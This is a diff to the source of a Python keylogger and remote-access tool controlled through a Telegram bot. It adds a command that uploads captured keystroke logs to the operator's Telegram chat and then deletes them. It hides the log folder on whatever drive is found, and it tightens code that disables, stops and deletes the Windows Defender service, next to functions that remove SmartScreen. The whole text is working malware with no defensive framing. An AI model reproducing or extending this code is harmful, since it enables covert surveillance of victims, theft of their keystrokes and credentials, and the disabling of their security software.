@@ -1034,20 +1034,56 @@ def handle_disable_windows_security(message):
         if os.path.exists(error_log_path):
             os.remove(error_log_path)
 
+# Send keylogs to Telegram Bot
+@bot.message_handler(commands=['dkeylog'])
+def dkeylog(message):
+    folder_path, log_files = get_app_dir()
+
+    if folder_path is None or not log_files:
+        bot.send_message(message.chat.id, "No log files found on any drive.")
+        return
+
+    for log_file in log_files:
+        file_path = os.path.join(folder_path, log_file)
+
+        with open(file_path, 'rb') as file:
+            bot.send_document(message.chat.id, file, caption=log_file)
+
+        os.remove(file_path)
+
+    bot.send_message(message.chat.id, "Log files sent and deleted from drive: " + folder_path)
+
 # Continuation of Keylogger Functions
 # Get path to Driver directory
 def get_app_dir():
-    return os.path.join(os.path.expanduser('~'), 'Documents', 'Driver')
+    partitions = psutil.disk_partitions()
+    drives = [p.mountpoint for p in partitions if p.device]
 
-# Create session files and set attributes
+    for drive in drives:
+        if os.path.exists(drive):
+            folder_path = os.path.join(drive, 'Driver')
+
+            if not os.path.exists(folder_path):
+                os.makedirs(folder_path)
+                print(f"Created folder: {folder_path}")
+
+            result = ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
+            if result == 0:
+                print(f"Failed to set {folder_path} as hidden. Error code: {ctypes.GetLastError()}")
+            else:
+                print(f"The folder {folder_path} is now hidden.")
+
+            log_files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
+            return folder_path, log_files
+
+    return None, None
+
+# Create session files
 def create_session_files():
-    folder_path = get_app_dir()
-    try:
-        os.makedirs(folder_path, exist_ok=True)
-        ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
-    except Exception as e:
-        log_message(f"Error creating session files: {e}", 'error')
-        sys.exit(1)
+    folder_path, log_files = get_app_dir()
+    if folder_path is None:
+        print("No folder path returned.")
+        return
 
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     return {
@@ -1321,6 +1357,14 @@ def disable_defender_realtime_protection():
 
 # Disable startup, stop and delete WinDefend
 def manage_windows_defender():
+    check_service = subprocess.run(
+        ["sc", "query", "WinDefend"],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+
+    if "does not exist" in check_service.stderr.decode('utf-8'):
+        print("Windows Defender service does not exist. Continuing with other commands.")
+
     commands = [
         ["sc", "config", "WinDefend", "start=", "disabled"],
         ["sc", "stop", "WinDefend"],
@@ -1328,25 +1372,27 @@ def manage_windows_defender():
     ]
 
     for command in commands:
-        result = subprocess.run(
-            command,
-            shell=False,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
+        try:
+            result = subprocess.run(
+                command, shell=False,
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
 
-        print(f"Command: {' '.join(command)}")
-        print(f"stdout: {result.stdout.decode('utf-8')}")
-        print(f"stderr: {result.stderr.decode('utf-8')}")
+            print(f"Command: {' '.join(command)}")
+            print(f"stdout: {result.stdout.decode('utf-8')}")
+            print(f"stderr: {result.stderr.decode('utf-8')}")
 
-        if result.returncode != 0:
-            error_msg = f"Error running command: {' '.join(command)}\n"
-            error_msg += f"stderr: {result.stderr.decode('utf-8')}\n"
-            error_msg += f"stdout: {result.stdout.decode('utf-8')}"
-            raise Exception(error_msg)
-        else:
-            print(f"Command executed successfully: {' '.join(command)}")
+            if result.returncode != 0:
+                error_msg = f"Error running command: {' '.join(command)}\n"
+                error_msg += f"stderr: {result.stderr.decode('utf-8')}\n"
+                error_msg += f"stdout: {result.stdout.decode('utf-8')}"
+                print(error_msg)
+            else:
+                print(f"Command executed successfully: {' '.join(command)}")
+
+        except Exception as e:
+            print(f"Unhandled exception while executing command {' '.join(command)}: {e}")
 
 # Change permission, kill and delete smartscreen
 def manage_smartscreen():
